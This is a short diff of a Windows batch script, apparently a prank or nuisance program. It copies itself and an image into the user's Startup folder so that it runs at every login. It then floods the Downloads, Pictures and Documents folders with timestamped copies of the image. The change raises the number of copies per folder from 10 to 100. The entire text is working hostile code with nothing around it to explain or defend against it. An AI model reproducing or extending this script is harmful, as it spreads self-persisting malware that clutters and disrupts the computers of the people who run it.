@@ -3,7 +3,7 @@ Xcopy /I /Y .\hehe.bat "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\St
 Xcopy /I /Y .\hehe.jpg "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 set rmcolon=%time::=%
 set rmcomma=%rmcolon:,=%
-FOR /L %%A IN (1,1,10) DO (
+FOR /L %%A IN (1,1,100) DO (
 	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Downloads\hehe"%%A""%rmcomma%".jpg*
 	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Pictures\hehe"%%A""%rmcomma%".jpg*
 	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Documents\hehe"%%A""%rmcomma%".jpg*	
